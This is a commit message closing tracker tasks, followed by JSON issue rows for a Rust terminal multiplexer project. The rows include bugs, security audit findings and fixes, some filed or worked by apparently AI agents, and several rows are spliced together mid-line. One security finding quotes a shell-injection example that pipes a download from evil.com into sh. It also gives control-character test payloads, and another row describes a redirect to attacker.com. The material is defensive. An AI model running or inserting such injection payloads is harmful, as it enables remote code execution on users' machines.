message:
chore(beads): close four tasks whose fixes already landed in prior commits

Move four beads from open/in_progress to closed so the local beads
store agrees with git history. The underlying work was already
committed; these entries were outstanding because the close step had
not been flushed.

- ft-4o5mb.6 — "add ignored wa.event mutator conformance skeleton"
  closed with "Partial verify in 3bad3568: added ignored wa.event
  mutator conformance skeleton".
- ft-6fm0w  — "add detect_with_context streaming fuzz target"
  closed with "Shipped in b475d5c0: add detect_with_context streaming
  dedup fuzz target".
- ft-eu0no.1 — "mark shared MCP rate-limit regression ignored"
  closed with "Partial verify in b6c762b5: marked existing shared MCP
  rate-limit regression ignored".
- ft-kbbc3  — "wa.tx_run integrity" closed with "Shipped in b7b44081:
  wa.tx_run now goes through real executor (no synthetic allow
  path)".

Only status, updated_at, closed_at, and close_reason change for each
row. No titles, descriptions, priorities, or issue_type values are
touched. No new issues are added or removed.

 {"id":"ft-4qom2","title":"[SEV] tmux cmd_queue cap only enforced at pop site; unbounded growth when state != Idle","description":"frankenterm/mux/src/tmux.rs TmuxDomainState.cmd_queue has CMD_QUEUE_MAX_DEPTH=50_000 enforced only inside send_next_command at line 289 via cmd_queue.drain(..excess). send_next_command early-returns at line 286-288 when state != Idle, so the drain-oldest logic never runs if tmux is stuck in State::WaitingForResponse.

Four push sites append to cmd_queue with NO cap check:
- line 196: Event::LayoutChange -> ListAllPanes
- line 223: Event::SessionChanged -> ListCommands
- line 234: Event::WindowAdd -> ListAllWindows
- line 375: split_pane (user split) -> SplitPane

Concrete interleaving: (1) tmux sends a command, enters State::WaitingForResponse; (2) tmux server is slow/hung (real-world scenario: remote tmux on lagging SSH link, tmux server overloaded, Event::Guarded response delayed); (3) GUI user resizes window repeatedly -> stream of Event::LayoutChange -> each push_back at line 196 runs without cap check; (4) send_next_command early-returns because state != Idle. Queue grows unbounded -> memory leak, eventual OOM.

The CMD_QUEUE_MAX_DEPTH comment at line 32-33 explicitly advertises 'prevent unbounded memory growth during event storms' as a safety invariant. That invariant is currently only upheld at the pop site, where it can't run under the exact condition (stuck tmux) that event storms exploit.

Fix: extract the cap-enforcement logic into a push_command_capped helper that applies the drain-oldest + warn/error logging at every push site. The helper runs under the cmd_queue lock (just acquired by the caller), so it's atomic with the push and has no additional locking cost.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T00:17:26.601099Z","created_by":"jemanuel","updated_at":"2026-04-21T00:21:03.160715Z","closed_at":"2026-04-21T00:21:03.158111Z","close_reason":"Completed: added push_command_capped() helper and routed all 4 production push sites (LayoutChange/SessionChanged/WindowAdd/split_pane) through it. The hard cap is now enforced at push time, not only at pop time — closing the unbounded-growth window when tmux is stuck in State::WaitingForResponse. cargo check passes clean. Commit 1055cffc.","source_repo":".","compaction_level":0,"original_size":0}
 {"id":"ft-4r2ib","title":"[mission][dispatch] MissionDispatcher reports accepted dispatch without calling WorkflowRunner::handle_detection","description":"In `crates/frankenterm-core/src/mission_dispatch.rs:200-226`, `dispatch_single()` builds a synthetic detection, then only calls `runner.find_matching_workflow(&detection)` and fabricates `accepted: true` plus a synthetic `execution_id` when a workflow exists. It never invokes `WorkflowRunner::handle_detection()`, so no lock acquisition, no concurrency-limit enforcement, no storage row, and no real workflow start happen.

Impact: callers receive a success-shaped `DispatchResult` that claims work was accepted even though the runner was never asked to start anything.

Fix direction: bridge the sync mission loop to the async runner start path with a bounded runtime, map the actual `WorkflowStartResult` into `DispatchResult`, and only emit started metadata from a real start result.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-23T20:09:03.405716Z","created_by":"jemanuel","updated_at":"2026-04-23T20:16:34.545322Z","closed_at":"2026-04-23T20:16:34.544924Z","close_reason":"Shipped in 0761bb33: mission dispatch now calls WorkflowRunner::handle_detection and returns real start metadata","source_repo":".","compaction_level":0,"original_size":0}
 {"id":"ft-4z7vh","title":"RobotCommands::Workflow builds PolicyEngine without require_prompt_active/command_gate/rules — bypasses operator safety config","description":"AUTH BYPASS (robot mode mutations, Severity: Medium).

crates/frankenterm/src/main.rs has 10 PolicyEngine::new call sites. 8 of them wire require_prompt_active from config + .with_command_gate_config(config.safety.command_gate.clone()) + .with_policy_rules(config.safety.rules.clone()). Two do NOT, both under RobotCommands::Workflow:

Site 1 (main.rs:19831, RobotCommands::Workflow::Run):

  let policy_engine = PolicyEngine::new(
      config.safety.rate_limit_per_pane,
      config.safety.rate_limit_global,
      false, // Don't require prompt active for robot mode
  )
  .with_tuning(&config.tuning);

No command_gate, no policy_rules, and require_prompt_active hardcoded false. This engine is fed into CxPolicyInjector → WorkflowRunner; any workflow step that calls send_text (e.g., handle_compaction sending '/compact', handle_usage_limit sending '/refresh') bypasses:
  - the operator's safety.require_prompt_active=true policy,
  - every [[safety.rules]] custom gate,
  - the [safety.command_gate] allow/deny list.

Site 2 (main.rs:20511, RobotCommands::Workflow::Abort): identical construction. abort_execution_with_cx runs compensation steps through the same injector; any send_text in a compensation path bypasses the same three surfaces.

Compare the correctly-gated paths:
  - RobotCommands::Send at main.rs:17652 uses config.safety.require_prompt_active AND .with_command_gate_config + .with_policy_rules.
  - Non-robot workflow invocations at main.rs:21361, 21533, 25051, 27347 all wire the full policy surface.

NOT a duplicate of ft-48ah6 (read-only policy): this bead is specifically about the write/mutation surface (workflow's send_text / command-bearing steps). ft-48ah6 covered the read/search side.

Fix: replace the hardcoded 'false' with config.safety.require_prompt_active at both sites, and chain .with_command_gate_config(config.safety.command_gate.clone()) + .with_policy_rules(config.safety.rules.clone()) before passing the engine to PolicyGatedInjector. Rate-limit args are already correct.

Regression test: a send inside a robot-invoked workflow must be DENIED when config.safety.require_prompt_active=true AND no prompt is active, matching the direct-send gate behavior. Currently it is allowed.","status":"closed","priority":2,"issue_type":"bug","assignee":"pane5","created_at":"2026-04-23T06:46:59.925741Z","created_by":"jemanuel","updated_at":"2026-04-23T07:19:54.084786Z","closed_at":"2026-04-23T07:19:54.084480Z","close_reason":"Fixed in 834b59f2. Both RobotCommands::Workflow::Run (main.rs:19831) and ::Abort (main.rs:20520) now build PolicyEngine with config.safety.require_prompt_active and chain .with_command_gate_config + .with_policy_rules — matching the construction at RobotCommands::Send (main.rs:17652) and non-robot workflow sites (21361/21533/25051/27347). Regression test robot_workflow_policy_engine_denies_send_when_prompt_required_ft_4z7vh asserts SendText is denied when require_prompt_active=true + command_running. Test binary compile is currently blocked by pre-existing concurrent-agent breakage (E0603 macro select private, E0063 missing defer_fts_triggers field) unrelated to this fix.","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-61kg4","title":"events::EventDeduplicator::check: max_capacity=0 degrades to 1-slot ghost cache (parallel to ft-bx4le)","description":"crates/frankenterm-core/src/events.rs:843-891 EventDeduplicator::check with max_capacity=0 does NOT disable deduplication. Instead: the novel-key eviction path at line 875 fires (entries.len()=0 >= 0=true), pop_front on empty insertion_order is a no-op, and the insert at line 881-888 still succeeds. Effect on alternating keys A, B, A: each is reported 'New' (because evict-then-insert toggles which key occupies the single slot), but an immediate repeat of the same key returns Duplicate. This is the same 'zero capacity → 1-slot ghost cache' shape fixed in connector_inbound_bridge ft-bx4le (commit 8fdfd114).  {"id":"ft-6269x","title":"[reality-gap] ft snapshot restore Unix-only status is not disclosed in README session-persistence matrix","description":"# Claim (README)

README.md:128 Session Persistence matrix row:

    | Session persistence | Supported with backend prerequisite |
    Snapshots, session inspection, restore, and `ft session doctor`
    are implemented, but live restore still depends on the current
    WezTerm mux interop boundary. \`ft restart\` is currently
    Unix-only. |

Disclosed: `ft restart` Unix-only.
Undisclosed: `ft snapshot restore` has the *same* cfg gate.

# Reality (code)

`crates/frankenterm/src/main.rs:27100` (ft restart — disclosed):

    eprintln!("ft restart is currently supported only on Unix platforms.");

`crates/frankenterm/src/main.rs:39715` (ft snapshot restore — NOT disclosed):

    eprintln!("ft snapshot restore is currently supported only on Unix platforms.");

Same gate, same failure mode. README line 128 specifically mentions
`ft restart` as the Unix-only surface but omits `ft snapshot restore`,
which is also mentioned in the *same* matrix row ("Snapshots, session
inspection, **restore**, and `ft session doctor` are implemented").

A Windows operator reading the matrix is told "restore is
implemented" (true, on Unix) without the cross-platform caveat.

# Failure shape

Operator on Windows runs `ft snapshot restore ...` → eprintln hits
→ exit 1. Workaround unknown.

# Recommended disposition

Update README.md:128 to say:

    Snapshots and session inspection are implemented cross-platform;
    `ft restart` and `ft snapshot restore` are currently Unix-only.

One-line doc change. Alternative: fix the cfg gate. The session
persistence code under `#[cfg(unix)]` likely depends on real Unix
signals / fork semantics — porting is non-trivial. Docs-first is
the pragmatic path.

# Related

ft-2guux previously flagged G2 "`ft restart` Unix-only not in
support matrix" and was closed 2026-04-21 with a README.md:128
update. That update added disclosure for `ft restart` but missed
`ft snapshot restore` — this bead is the follow-up.","status":"closed","priority":2,"issue_type":"task","assignee":"pane8","owner":"pane3-readme-fix","created_at":"2026-04-21T20:44:55.113196Z","created_by":"reality-check","updated_at":"2026-04-23T00:18:55.619147Z","closed_at":"2026-04-21T20:49:57.208098Z","close_reason":"done","source_repo":".","compaction_level":0,"original_size":0,"labels":["docs","platform","reality-gap"]}
 {"id":"ft-682n6","title":"Migrate ~50 tokio-based async tests to asupersync runtime (ft-22x4r tracked)","description":"# Goal
Convert ~50 tests using #[tokio::test] to work with the asupersync runtime. These tests fail at runtime with: task::spawn called outside of Runtime::block_on context. Originally tracked as ft-22x4r.

# Background
The asupersync migration replaced tokio, but ~50 tests still use #[tokio::test]. Count verified 2026-04-06: 50 in .rs files (excluding .bak). Most are in *_labruntime.rs test files (2 per file across ~25 files) plus 2 in dependency_eradication.rs.

# Design
## Discovery (exact count at implementation time)
1. grep -r '#\[tokio::test\]' crates/ --include='*.rs' | grep -v '.bak' > /tmp/tokio_tests.txt
2. Count and categorize by file pattern:
   - *_labruntime.rs files: ~25 files × 2 tests = ~50 tests (async smoke + basic scenario)
   - dependency_eradication.rs: 2 tests
3. For each, identify tokio primitives used: spawn, sleep, channels, timeout

## Migration strategy
- *_labruntime.rs pattern: These all follow the same template (2 tests per file). Once one is migrated, the rest are mechanical.
  Replace: #[tokio::test] with #[test] + runtime_compat::block_on(async { ... })
  Or: if asupersync provides a test macro, use that
- Replace tokio::spawn -> runtime_compat spawn equivalent
- Replace tokio::time::sleep -> runtime_compat::sleep
- Replace tokio channels -> runtime_compat channels

## Batch approach
Since *_labruntime.rs files follow a uniform pattern, write a migration helper that does the mechanical replacement, then verify each file compiles.

## Structured Logging
- Migration log: file, old_macro, new_macro, primitives_replaced, compile_status

# Acceptance Criteria
1. Zero #[tokio::test] in .rs files (verified by grep, excluding .bak).
2. All ~50 previously-failing tests now pass.
3. No semantic changes — same assertions.
4. Total test count preserved.
5. No new tokio dependencies.
6. Commit message lists affected files.

# Implementation Notes
- runtime_compat.rs provides bridge primitives.
- The *_labruntime.rs naming convention suggests these are lab/smoke tests for async behavior.
- This bead unblocks ft-xbnl0.2 (async cutover epic).
- Coordinate with ft-n2j5w (MCP test fix) if any MCP tests also use tokio::test.","status":"closed","priority":1,"issue_type":"task","estimated_minutes":240,"created_at":"2026-04-06T18:58:21.227738Z","created_by":"jemanuel","updated_at":"2026-04-07T02:55:15.155157Z","closed_at":"2026-04-07T02:55:15.154811Z","close_reason":"Verified: zero actual #[tokio::test] annotations remain in crates/frankenterm-core/. All 50 occurrences found by grep are in comments/docstrings/string literals describing the migration that was already done. The *_labruntime.rs files already use #[test] + RuntimeFixture::current_thread().block_on(). No code changes needed.","source_repo":".","compaction_level":0,"original_size":0,"labels":["asupersync","migration","testing"]}

 {"id":"ft-6gqga","title":"[stub] workflows/wait_execution.rs:199-204: WaitCondition::External permanently returns Unsupported","description":"# Genuine production stub

File: `crates/frankenterm-core/src/workflows/wait_execution.rs:199-204` — `WaitConditionExecutor::execute_wait` arm for `WaitCondition::External { key }`.

```rust
WaitCondition::External { key } => {
    // External signals are not implemented in this layer
    Ok(WaitConditionResult::Unsupported {
        reason: format!("External signal '{key}' requires external signal registry"),
    })
}
```

This is not a platform stub (the pattern-wait and timeout-wait arms above it are fully implemented) — `External` is a first-class variant of the public `WaitCondition` enum but the execution path has NEVER been wired. Every caller that constructs `WaitCondition::External { key }` silently gets `Unsupported` back. The error hint names 'external signal registry' as a missing dependency, but no such registry exists anywhere in the crate (`rg 'external.*signal.*registry' crates/frankenterm-core/src` returns zero hits).

# Scope — NOT the same as the frankensqlite family

Recorder/ingest/reindex FrankenSqlite stubs are tracked under the BLOCKED wa-2l27x.8 FrankenSQLite migration plan and were narratively disclosed via ft-trby3. The `WaitCondition::External` stub has no parent bead — it's an orphaned production gap.

# Fix options

1. **Remove the variant.** If no caller actually constructs `External`, the enum should not expose the variant. Git blame shows the variant was added speculatively; `rg 'WaitCondition::External' crates` finds only the match arm and the enum declaration — no producer. Cleanest fix: delete the variant + match arm, file the follow-up when an external-signal feature is actually designed.

2. **Implement the registry.** Introduce a `SignalRegistry` trait with pub fn `signal(key: &str)` / `wait(key: &str, timeout: Duration) -> future`. Thread it through `WaitConditionExecutor::new`. Non-trivial — requires designing signal lifetime/TTL semantics.

Recommend option (1) pending a real consumer. Either way, `WaitConditionResult::Unsupported` has no legitimate emit site after the fix.

# Acceptance

Either `WaitCondition::External` is removed from the public enum + all tests updated, OR the executor actually waits on a registered external signal and the integration is covered by a test that registers, fires, and observes the signal.","status":"closed","priority":2,"issue_type":"bug","created_at":"2026-04-23T05:45:23.924074Z","created_by":"jemanuel","updated_at":"2026-04-23T06:06:29.076549Z","closed_at":"2026-04-23T06:06:29.076246Z","close_reason":"Fixed in ef9c7895","source_repo":".","compaction_level":0,"original_size":0}

 {"id":"ft-eze48","title":"[fuzz] add FtviIndex::from_bytes harness for vector index loader","description":"The FTVI vector-index binary loader is public and currently unfuzzed.

Evidence:
- `crates/frankenterm-core/src/search/mod.rs:73` publicly re-exports `FtviIndex`.
- `crates/frankenterm-core/src/search/vector_index.rs:218-267` parses attacker-controlled bytes in `FtviIndex::from_bytes`, including magic/version checks, dimension/count headers, and per-record half-float decoding loops.
- `fuzz/Cargo.toml` has no target for `FtviIndex::from_bytes`.

Why it matters:
- This is a binary format loader over persisted search state, so malformed bytes can hit allocation pressure, unexpected EOF handling, half-float edge cases, and count/dimension loops.
- The surface is already public, synchronous, and easy to fuzz without extra seams.

 {"id":"ft-jqvg5","title":"Resolve frankenterm-core clippy -D warnings gate","description":"# Workspace-level clippy gate

## Background
Discovered during ft-xbnl0.2.4 tick 356 verification sweep. The
`frankenterm-core` crate reports **17 clippy errors** when run with
`-D warnings`:

    cargo clippy --no-deps -p frankenterm-core \\
        --features distributed,asupersync-runtime,web \\
        --lib --tests -- -D warnings

All 17 errors are in files **unrelated to ft-xbnl0.2.4**:

- `src/ipc.rs`
- `src/robot_sdk_contracts.rs`
- `src/runtime.rs`
- `src/snapshot_engine.rs`
- `src/ui_query.rs`
- `src/workflows/engine.rs`
- `src/workflows/runner.rs`

These are from recent commits by other agents.

## Why not fix in ft-xbnl0.2.4
AGENTS.md explicitly instructs "NEVER ... disturb in ANY way the work of
other agents." The violations may be:
- awaiting `#[allow(...)]` annotations from their owners
- pending intentional restructures
- already planned for cleanup

Touching them without coordination could override the owners' planned
solutions.

## Fix categories observed (examples)
- `clippy::duration-suboptimal-units` — `Duration::from_millis(2_000)` should be `from_secs(2)`
- `clippy::redundant-closure` — `|| crate::foo()` should just be `crate::foo`
- `clippy::semicolon-if-nothing-returned` — trailing unit-valued expression without semicolon
- Several others (see `cargo clippy` output at time of fix)

## Suggested approach
For each file, coordinate with the owning agent (via Agent Mail or by checking
recent git history for active work) before applying fixes. Prefer:
1. Fixing real issues over `#[allow(...)]` annotations.
2. Single-file commits so each fix is easy to review.
3. Running `ubs` on each file after the clippy fix to avoid introducing
   new bugs in the cleanup.

## Not a blocker for ft-xbnl0.2.4
The ft-xbnl0.2.4-scoped files (`src/distributed.rs`, `src/metrics.rs`,
`src/runtime_compat.rs`, `tests/web.rs`, `tests/ft_xbnl0_2_4_*.rs`) produce
zero clippy warnings.

See: `docs/ft-xbnl0-2-4-completion-evidence.md §6.1.1`.","status":"closed","priority":3,"issue_type":"task","assignee":"FoggyRobin","created_at":"2026-04-18T18:04:55.194692Z","created_by":"jemanuel","updated_at":"2026-04-19T15:17:33.170677Z","closed_at":"2026-04-19T15:17:33.170424Z","close_reason":"done","source_repo":".","compaction_level":0,"original_size":0,"labels":["clippy","code-quality","workspace-gate"],"dependencies":[{"issue_id":"ft-jqvg5","depends_on_id":"ft-xbnl0.2.4","type":"related","created_at":"2026-04-18T18:05:03.540304Z","created_by":"jemanuel","metadata":"{}","thread_id":""}]}
 {"id":"ft-jz40p","title":"[MEDIUM] TimeSeries::percentile(NaN) returns smallest value instead of None","description":"# Defect

`crates/frankenterm-core/src/time_series.rs:239` — `TimeSeries::percentile_range` (and the `percentile` convenience that delegates to it).

Same class as ft-b4l62 (telemetry Histogram::quantile, fixed 2c7b891c). The function relies on `p.clamp(0.0, 1.0)` to validate its input, but `f64::clamp(NaN, _, _)` returns NaN (documented Rust behaviour), so a NaN `p` cascades through:

```rust
let p = p.clamp(0.0, 1.0);                          // NaN stays NaN
let idx = ((values.len() - 1) as f64 * p)           // NaN
    .round() as usize;                              // NaN as usize = 0
Some(values[idx])                                   // smallest value
```

A NaN quantile arg silently returns the smallest sample — a plausible-looking number that has no relationship to the requested percentile. Pre-fix the Histogram analog had the same bug; the fix pattern is identical.

## Fix

```rust
if values.is_empty() || p.is_nan() {
    return None;
}
```

Matches the ft-b4l62 disposition: NaN `p` is explicitly `None` rather than a silently-wrong small value.

## Tests

* `ft_jz40p_percentile_nan_returns_none` — pins None return for NaN p.
* `ft_jz40p_percentile_infinity_inputs_still_work` — regression: ±inf still clamp to 0.0/1.0 and return min/max samples (pre-existing contract, not broken by the new NaN guard).

## Scope

Single file (`time_series.rs`).","status":"closed","priority":2,"issue_type":"bug","assignee":"pane1","created_at":"2026-04-22T12:11:47.750602Z","created_by":"jemanuel","updated_at":"2026-04-22T17:22:17.756502Z","closed_at":"2026-04-22T17:22:17.756187Z","close_reason":"Fix and both regression tests already landed (time_series.rs:246-254 + :720-745). percentile_range now guards with 'if values.is_empty() || p.is_nan() { return None; }' at line 252, so percentile(NaN) returns None instead of silently returning the smallest sample via NaN-clamp-to-0 → (NaN as usize)==0 cascade. -{"id":"ft-kbbc3","title":"[tx][integrity][P1] wa.tx_run evaluates synthetic (allow-all + always-success) inputs and persists fabricated Committed state to the tx contract file","description":"## Finding

The production MCP tool `wa.tx_run` at `crates/frankenterm-core/src/mcp_tools.rs:2985-3186` runs its prepare/commit/compensate pipeline on **synthetic inputs**, not on real executor outputs. It then persists the synthetic-success results to the tx contract file on disk.

### Call sequence

1. `wa.tx_run` handler loads the MissionTxContract from disk.
2. `let gate_inputs = mcp_build_tx_prepare_gate_inputs(&contract);` at :3089. Under the alias in mcp.rs:56 this resolves to `crate::plan::tx_prepare_gate_inputs_allow_all(contract)` — a helper at plan.rs:3438 that hardcodes `policy_passed: true`, `reservation_available: true`, `approval_satisfied: true`, `target_liveness: true` for every step.
3. `evaluate_prepare_phase` is fed those all-true inputs and returns AllReady.
4. `let commit_inputs = mcp_build_tx_commit_step_inputs(...)` at :3121 resolves to `mission_tx_commit_step_inputs` at plan.rs:3571, which hardcodes `success: true` for every step unless the caller explicitly passes `fail_step`.
5. Same for compensation.
6. The resulting `TxCommitReport` / `TxCompensationReport` is written back to the contract file via `mcp_save_mission_tx_contract_to_path` at :3186 with `lifecycle_state` set to the target (typically Committed) and receipts populated.

### Impact

- The MCP tool description at :2990 says "Execute deterministic tx prepare+commit and compensation on partial failure (robot parity)" — operators reasonably infer real execution.
- A peer agent invoking `wa.tx_run` on a contract with (e.g.) a step that SHOULD fail policy gating will see the contract transition to Committed on disk without any real policy check having fired.
- A downstream tool that queries the tx contract file (`wa.tx_show --include-contract`, operator dashboards, audit exports) will see a fabricated success state. The audit log will record the transitions without any runtime evidence that the underlying steps happened.
- The REAL executor infrastructure (`PaneStepExecutor` at tx_execution.rs:234, `TxExecutionEngine` at :731) is grep-verified to NOT be called from the MCP path (zero matches for either type in mcp_tools.rs). They exist but are unused by wa.tx_run.

### Related beads (context)

- ft-bekwl + ft-npj7t (both closed) fixed a parallel 'synthetic success in compensation' path in `PaneStepExecutor`. This bead is DIFFERENT: the MCP handler doesn't use `PaneStepExecutor` at all.
- ft-73f9r added an e2e test for wa.tx plan/run/rollback. That test validates deterministic-synthetic behavior, not real-executor behavior — so it doesn't catch this gap.

### Fix direction

The correct call sequence for `wa.tx_run` is:
1. Build a real `PaneStepExecutor` (needs wezterm handle, reservation manager, policy engine with rate limiter, storage).
2. Call `PaneStepExecutor::evaluate_gates(contract, now_ms)` for real prepare inputs.
3. Feed those to `evaluate_prepare_phase`.
4. If prepare passes, call `PaneStepExecutor::execute_steps(contract, fail_step, now_ms)` for real commit inputs.
5. Feed those to `execute_commit_phase`.
6. If commit fails partially, call `PaneStepExecutor::execute_compensations(contract, &commit, fail_for_step, now_ms)` and feed to `execute_compensation_phase`.

This is a substantial refactor: the MCP handler currently has neither the wezterm handle, reservation manager, nor policy engine in the right shape. Approximate size: ~150-200 LoC + per-step executor wiring.

### Interim mitigation

Until the real executor is wired, `wa.tx_run` should either:
(a) Return a clear 'simulation' marker in the envelope (e.g., `data.mode: "synthetic_preview"`) and refuse to persist lifecycle_state changes back to the contract file, OR
(b) Be gated behind an explicit `--simulate` flag and error when called without it.

(a) is the smaller diff and preserves current e2e tests. (b) is more operator-clear but breaks the tool's default behavior.

### Severity rationale

P1 (not P0):
- No direct remote exploitation path: MCP ships over stdio/localhost by default and `wa.tx_run` is already gated by `mcp_authorize_mcp_mutation` per ft-x86z2 (so it's behind policy auth).
- But the persisted synthetic-success state on disk is a real data-integrity hazard for any operator reading the tx contract file as authoritative.

 {"id":"ft-kcsae","title":"[mor:performance-engineering] storage.rs at 31k lines — is FTS5 indexing synchronous on the capture path?","description":"# Observation

storage.rs is 31,648 lines (largest module in the core crate). It
owns a SQLite connection with WAL, drives FTS5 virtual tables for
the lexical-search surface, and handles retention sweeps
(\`database_stats(..., retention_days)\` at line 3758).

FTS5 writes are expensive — they rebuild inverted-index pages on
INSERT/UPDATE. If the capture path writes rows AND the FTS5 trigger
runs synchronously in the same transaction, every captured segment
pays the indexing cost before the write returns, which is pushed
onto the hot path at the very point where backpressure is trying
to keep up.

Not verified in this pass — just the shape of the concern given
the size of storage.rs and the presence of FTS5. Worth a targeted
read of the capture-write code path.

# Question

Three measurements that would clarify whether this matters:

1. Is there a "defer FTS5 indexing to a background task" path, or
   do FTS5 triggers fire in the capture-write transaction?
2. What's the p99 latency of \`insert_pane_output\` under a 200-pane
   load with FTS5 enabled vs disabled?
3. Is there an async/batch FTS5 index-catchup task that operators
   can offload indexing to?

If (1) is "synchronous" and (2) shows meaningful gap between
enabled/disabled, then an async-index mode is probably the fattest
win in the capture subsystem. Memory budget permits: a lag of
seconds in search freshness is almost always an acceptable trade
for linear-capture throughput during incidents.

# Structural note

31k lines in one module suggests the subsystem has grown through
absorption rather than redesign. Might be worth sketching the
module boundaries as a separate planning exercise before
optimizing; "where does latency go when we write a segment" is a
question that should have a one-page answer.","status":"closed","priority":3,"issue_type":"task","created_at":"2026-04-21T17:36:06.994443Z","created_by":"mor-review","updated_at":"2026-04-23T00:18:49.264506Z","closed_at":"2026-04-21T18:01:07.435839Z","close_reason":"Answered. Q1 (sync or async?): SYNCHRONOUS — three AFTER INSERT/DELETE/UPDATE triggers at storage.rs:169-180 fire inside every append_segment_sync transaction (storage.rs:12308). Q2 (p99 measurement): not run — needs a load harness. Q3 (async catchup available?): infrastructure EXISTS (fts_pane_progress table storage.rs:472 + sync_fts_on_startup storage.rs:16131 + FtsSyncConfig storage.rs:2363) but is wired only for startup recovery and explicit rebuild, NOT for live capture. Follow-up for the actual move-to-deferred work filed as ft-wk5fo with concrete plan + risk notes + measurement prerequisite.","source_repo":".","compaction_level":0,"original_size":0,"labels":["fts5","mor","performance","storage"]}
 {"id":"ft-kegvt","title":"[MEDIUM] launch_agent pipes restored `command` into shell via send_text without CR/LF sanitization","description":"Found during /security-audit-for-saas pass #4 (pane 5, 2026-04-21).

## Summary
`restore_process.rs::launch_agent_legacy` (line 625) and
`launch_agent_cx` (line 648) build the command string for a restored
pane by `format!("{command}\r", ...)` and then sending it to the
pane shell via `self.wezterm.send_text(pane_id, &full_cmd)`. The
pane shell is an active interactive shell (not an argv-isolated
subprocess), so any `\r` or `\n` in `command` injects additional
lines into the shell's input buffer.

## Evidence
- crates/frankenterm-core/src/restore_process.rs:625
  ```rust
  async fn launch_agent_legacy(
      &self,
      pane_id: u64,
      command: &str,          // <- from RestoredPaneState.command
      cwd: &Path,
      agent_type: &str,
  ) -> Result<(), String> {
      let cd_cmd = format!("cd {}\r", shell_escape(cwd));
      self.wezterm.send_text(pane_id, &cd_cmd).await...;
      ...
      let full_cmd = format!("{command}\r");   // <- unsanitized
      self.wezterm.send_text(pane_id, &full_cmd).await...;
  ```
- crates/frankenterm-core/src/restore_process.rs:648 — the cx-first
  variant has the same shape and the same gap.
- Note the asymmetry: `cwd` IS passed through `shell_escape(cwd)`,
  but `command` is not. The cd helper got the defensive treatment;
  the main command did not.

## Impact / trust boundary
`RestoredPaneState.command` is loaded from the SQLite session DB
at `session_restore.rs:892` where `state.command` is read from the
`mux_pane_state` table. Attack paths requiring this field to be
attacker-controlled:

1. DB write access (already implies full-user compromise; out of
   scope as a net-new threat).
2. Snapshot bundle import from an untrusted source — `ft diag
   bundle` round-trips include session data; if someone shares a
   diag bundle and it gets restored, the imported `command`
   values pass through this path.
3. `ft restart --launch-agents` applied after a targeted
   corruption of `mux_pane_state` rows.

Severity: MEDIUM. Not a remote zero-click — requires an existing
trust-boundary crossing — but the defense-in-depth gap is concrete:
a restored `command` like `claude-code\r curl evil.com/x | sh`
would execute the second line in the user's shell on
`ft restart --launch-agents`.

## Fix direction
1. Quick (defense in depth): reject or strip any `\r`/`\n` from
   `command` before formatting. A restored command that needs
   multi-line input is already broken — the typing model assumes
   one command per restore. Concretely:
   ```rust
   if command.chars().any(|c| matches!(c, '\r' | '\n')) {
       return Err(format!(
           "refusing to launch pane {pane_id}: restored command contains CR/LF"
       ));
   }
   ```
2. Proper (larger): route relaunch through `wezterm cli spawn --`
   with argv-isolated arguments instead of typing into an
   interactive shell. Eliminates shell metacharacter concerns
   entirely.

## Non-gaps verified in the same pass
- Snapshot restore has NO direct `fs::write` / `fs::create_dir`
  path (grep confirmed zero hits in session_restore.rs +
  snapshot_engine.rs). Arbitrary-file-write via restore is not
  reachable today.
- Pattern-pack URL loading: `load_pack_from_id` at patterns.rs:963
  accepts only `builtin:` and `file:` schemes; any other scheme
  returns `PackNotFound`. No HTTP/URL fetch surface. **No SSRF.**
- FTS5 query escaping: user query passes to `MATCH ?1` as a bound
  rusqlite parameter at storage.rs:17486/17496; SQL injection is
  impossible and `validate_fts_query` rejects malformed FTS5 DSL
  cleanly. **Clean.**

## Related
- ft-security-mcp-path-traversal (fixed 30988e53) — same class of
  defense-in-depth gap across the MCP tool surface.
- ft-xv561 (fixed 070117a0) — ReDoS via user-pack regexes.

Filed per /security-audit-for-saas pass #4.","status":"closed","priority":1,"issue_type":"bug","created_at":"2026-04-21T04:28:12.543862Z","created_by":"jemanuel","updated_at":"2026-04-21T04:32:41.769958Z","closed_at":"2026-04-21T04:32:41.769575Z","close_reason":"Closed by 969b9e02. Added sanitize_restored_command() helper in restore_process.rs that rejects \r/\n/ESC/other C0 controls. Wired into both launch_agent_legacy (line 632) and launch_agent_cx (line 656) before format!({command}\r). 8 unit tests cover legitimate inputs (claude-code, codex resume, env-prefixed, UTF-8), the exact attack payload from the bead (claude-code\ninnocent_payload\r), bare CR/LF, OSC via ESC (\x1b]0;pwned\x07), BEL/NUL, and byte-offset fail-fast ordering. Does NOT route through wezterm cli spawn argv-isolated (documented as follow-up); this closure is the defense-in-depth gate at the sanitizer boundary.","source_repo":".","compaction_level":0,"original_size":0,"labels":["command-injection","defense-in-depth","restore","security"]}
 {"id":"ft-kfkyi","title":"DistributedHttpClient must not transparently follow 3xx redirects","description":"# Security: DistributedHttpClient transparent redirect following

## Background
Discovered during ft-xbnl0.2.4 tick 349 verification work. `DistributedHttpClient`
(built on the default asupersync HTTP client config) **follows 3xx redirects
transparently** by default. A 302 with an arbitrary `Location:` header is
followed without caller visibility.

Current behavior is pinned by `distributed_http_client_3xx_redirect_current_behavior_snapshot`
in `crates/frankenterm-core/src/distributed.rs` (tests module) — the test
asserts `Err` on a 302 whose Location is unresolvable, and explicitly
documents that assertion flipping is the trigger for this bead's work.

## Security concern
`DistributedHttpClient` is used for distributed node-to-node RPC (health
checks, event forwarding). Peer URLs are supposed to point at trusted
nodes. Transparent redirect following means:

- A compromised peer can respond `302 Location: http://attacker.com/` →
  next request body is sent to attacker (including event data, pane
  captures, auth tokens).
- Even without compromise, a misconfigured peer with a redirect loop
  could cause unbounded work.

## Fix
Configure `RedirectPolicy::none()` at the `DistributedHttpClient`
construction site — see `crates/frankenterm-core/src/distributed.rs`
around `DistributedHttpClient::new()` and `DistributedHttpClient::plaintext()`.

This forces the caller to explicitly handle (or ignore) the redirect.

## Verification
After the fix:
1. `distributed_http_client_3xx_redirect_current_behavior_snapshot` will
   fail — update it to assert `resp.status == 302` and rename to drop
   the "current-behavior-snapshot" suffix. Rename to
   `distributed_http_client_returns_3xx_redirect_as_ok_response`.
2. Add a second test asserting that a 302 → a different internal host
   is ALSO observable (not followed) — use a second TcpListener in
   the test so the "Location" resolves but the client still doesn't
   follow it.

## Out of scope
- Building a full redirect-following mechanism (if callers want redirects,
  they can opt in explicitly by following the Location themselves after
  inspecting it).
